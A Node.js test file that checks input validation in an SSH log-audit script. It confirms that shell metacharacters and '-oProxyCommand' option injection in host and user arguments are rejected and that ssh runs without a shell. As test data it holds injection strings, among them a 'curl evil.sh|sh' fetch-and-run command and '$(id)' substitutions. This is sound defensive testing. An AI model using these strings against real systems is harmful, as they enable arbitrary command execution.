import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { spawnSync } from 'node:child_process';

const auditScript = path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'scripts', 'audit.mjs');

// ---- CLI level: these are the exploits from the audit, run against the real script ----

function runAudit(cliArgs) {
  return spawnSync(process.execPath, [auditScript, ...cliArgs], { encoding: 'utf8', timeout: 20000 });
}

function freshMarker() {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'agent-log-ssh-'));
  return { dir, file: path.join(dir, 'pwned') };
}

test('CLI: --host with shell metacharacters is rejected before ssh is spawned', () => {
  const { dir, file } = freshMarker();
  try {
    const res = runAudit(['--host', `127.0.0.1; touch ${file}`, '--user', 'deploy']);
    assert.equal(res.status, 1);
    assert.match(res.stderr, /Invalid --host/);
    assert.equal(fs.existsSync(file), false);
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test('CLI: --host starting with "-" (ssh option injection) is rejected', () => {
  const res = runAudit(['--host', '-oProxyCommand=true', '--user', 'deploy']);
  assert.equal(res.status, 1);
  assert.match(res.stderr, /Invalid --host/);
});

test('CLI: --user starting with "-" (-oProxyCommand=...@host) is rejected and never executed', () => {
  const { dir, file } = freshMarker();
  try {
    const res = runAudit(['--host', '127.0.0.1', '--user', `-oProxyCommand=touch ${file}`]);
    assert.equal(res.status, 1);
    assert.match(res.stderr, /Invalid --user/);
    assert.equal(fs.existsSync(file), false);
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

// ---- Module level ----

const { formatSshTarget, buildRemoteCommand, buildSshArgs, runSsh } = await import('../scripts/ssh-remote.mjs');

test('formatSshTarget rejects dangerous hosts', () => {
  for (const host of ['1.2.3.4; curl evil.sh|sh', '$(id)', '`id`', 'a b', 'a\nb', 'host&&id', '-oProxyCommand=x', '-host', '', null, undefined]) {
    assert.throws(() => formatSshTarget(host, 'deploy'), /Invalid --host/, `host ${JSON.stringify(host)}`);
  }
});

test('formatSshTarget rejects dangerous users', () => {
  for (const user of ['-oProxyCommand=x', '-x', 'root;id', 'a@b', 'a b', '$(id)', '']) {
    assert.throws(() => formatSshTarget('example.com', user), /Invalid --user/, `user ${JSON.stringify(user)}`);
  }
});

test('formatSshTarget accepts normal values and has no implicit root user', () => {
  assert.equal(formatSshTarget('100.98.233.126', 'deploy_user-1'), 'deploy_user-1@100.98.233.126');
  assert.equal(formatSshTarget('my-box.example.com', 'deploy'), 'deploy@my-box.example.com');
  assert.equal(formatSshTarget('my-box.example.com'), 'my-box.example.com');
  assert.doesNotMatch(formatSshTarget('my-box.example.com'), /root/);
});

test('buildSshArgs hardens the connection (accept-new, BatchMode, ConnectTimeout, "--")', () => {
  const args = buildSshArgs('example.com', 'deploy', 'echo hi');
  const opts = args.filter((a, i) => args[i - 1] === '-o');
  assert.ok(opts.includes('StrictHostKeyChecking=accept-new'));
  assert.ok(!opts.includes('StrictHostKeyChecking=no'));
  assert.ok(opts.includes('BatchMode=yes'));
  assert.ok(opts.some((o) => /^ConnectTimeout=\d+$/.test(o)));
  // "--" must come right before the destination so it can never be read as an option.
  assert.deepEqual(args.slice(-3), ['--', 'deploy@example.com', 'echo hi']);
});

test('runSsh spawns ssh without a shell and passes target/command as separate argv elements', () => {
  const calls = [];
  const fakeSpawn = (cmd, argv, options) => { calls.push({ cmd, argv, options }); return { status: 0, stdout: '', stderr: '' }; };
  const remoteCmd = buildRemoteCommand(15);
  runSsh('example.com', 'deploy', remoteCmd, fakeSpawn);

  assert.equal(calls.length, 1);
  assert.equal(calls[0].cmd, 'ssh');
  assert.ok(Array.isArray(calls[0].argv));
  assert.equal(calls[0].options.shell, false);
  assert.equal(calls[0].argv.at(-2), 'deploy@example.com');
  assert.equal(calls[0].argv.at(-1), remoteCmd);
});

test('runSsh never spawns when host/user are invalid', () => {
  let spawned = false;
  const fakeSpawn = () => { spawned = true; return { status: 0 }; };
  assert.throws(() => runSsh('1.2.3.4; id', 'deploy', 'x', fakeSpawn), /Invalid --host/);
  assert.throws(() => runSsh('example.com', '-oProxyCommand=x', 'x', fakeSpawn), /Invalid --user/);
  assert.equal(spawned, false);
});

test('buildRemoteCommand only accepts a plain non-negative integer limit', () => {
  assert.match(buildRemoteCommand(300), /\[-300:\]/);
  for (const bad of [NaN, -1, 1.5, '5; id', undefined]) {
    assert.throws(() => buildRemoteCommand(bad), /Invalid line limit/);
  }
});

// The remote command now travels as ONE argv element and the remote sshd runs it with `sh -c`.
// Run it exactly that way to prove the quoting still works without the local shell wrapper.
function findWorkingPython() {
  for (const bin of ['python3', 'python']) {
    const r = spawnSync(bin, ['-c', 'print(42)'], { encoding: 'utf8' });
    if (r.status === 0 && r.stdout.trim() === '42') return bin;
  }
  return null;
}
const python = findWorkingPython();
const shAvailable = spawnSync('sh', ['-c', 'exit 0']).status === 0;

test('remote command still runs under `sh -c` (quotes, globs, no files => empty output)',
  { skip: !python || !shAvailable ? 'needs sh and a working python' : false },
  () => {
    const shimDir = fs.mkdtempSync(path.join(os.tmpdir(), 'agent-log-py-'));
    try {
      const shim = path.join(shimDir, 'python3');
      fs.writeFileSync(shim, `#!/bin/sh\nexec "${python}" "$@"\n`, { mode: 0o755 });
      const toSh = (p) => p.replace(/\\/g, '/');
      const res = spawnSync('sh', ['-c', buildRemoteCommand(25)], {
        encoding: 'utf8',
        env: { ...process.env, PATH: `${toSh(shimDir)}${path.delimiter === ';' ? ':' : path.delimiter}${process.env.PATH}` }
      });
      assert.equal(res.status, 0, res.stderr);
      assert.equal(res.stdout, '');
    } finally {
      fs.rmSync(shimDir, { recursive: true, force: true });
    }
  });
